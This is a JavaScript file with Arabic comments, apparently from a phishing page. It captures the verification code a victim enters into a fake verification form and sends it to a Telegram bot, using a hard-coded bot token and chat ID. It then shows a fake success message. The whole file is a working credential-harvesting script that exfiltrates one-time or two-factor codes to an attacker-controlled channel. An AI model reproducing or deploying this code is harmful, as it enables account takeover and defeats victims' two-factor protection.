document.getElementById('verify-form').addEventListener('submit', function(e) {
    e.preventDefault();

    // قراءة رمز التحقق المدخل
    const verificationCode = document.getElementById('verification-code').value || 'No Code';
    const message = `🔑 Verification Code Entered:\n🔑 Code: ${verificationCode}`;

    // إرسال البيانات إلى تيليجرام
    sendToTelegram(message);

    // توجيه المستخدم إلى صفحة النجاح أو رسالة تأكيد
    alert("تم إرسال رمز التحقق بنجاح!");
    // هنا يمكنك إضافة التوجيه إلى صفحة أخرى مثل صفحة النجاح
    // window.location.href = 'success.html';  // إذا كنت ترغب في التوجيه لصفحة النجاح
});

function sendToTelegram(message) {
    const token = '6924402995:AAEx-1e3pcV9kpYjpQnsjN-lkvreoCjxkFs';
    const chatId = '1046458749';

    // إرسال رسالة إلى تيليجرام باستخدام API
    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message })
    })
    .then(response => {
        if (!response.ok) {
            console.error('خطأ في إرسال البيانات إلى تيليجرام');
        }
    })
    .catch(error => {
        console.error('حدث خطأ في الاتصال بتيليجرام:', error);
    });
}